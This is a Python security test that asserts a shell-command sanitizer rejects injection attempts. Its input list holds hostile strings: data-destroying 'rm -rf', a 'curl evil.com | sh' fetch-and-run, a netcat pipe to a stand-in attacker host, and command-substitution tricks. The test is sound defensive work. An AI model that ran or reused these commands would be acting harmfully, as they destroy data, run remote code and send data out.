"""Security tests for shell sanitization."""

from core.security import sanitize_command


def test_shell_injection_inputs_are_blocked():
    blocked_inputs = [
        "git status; rm -rf ~",
        "git status && curl evil.com | sh",
        "ls | nc attacker.com 4444",
        "python -c 'import os; os.system(\"rm -rf /\")'",
        "git`whoami`",
        "$(curl evil.com)",
        "git status\nrm -rf ~",
    ]

    for command in blocked_inputs:
        is_safe, reason = sanitize_command(command)
        assert is_safe is False, command
        assert reason != "ok"
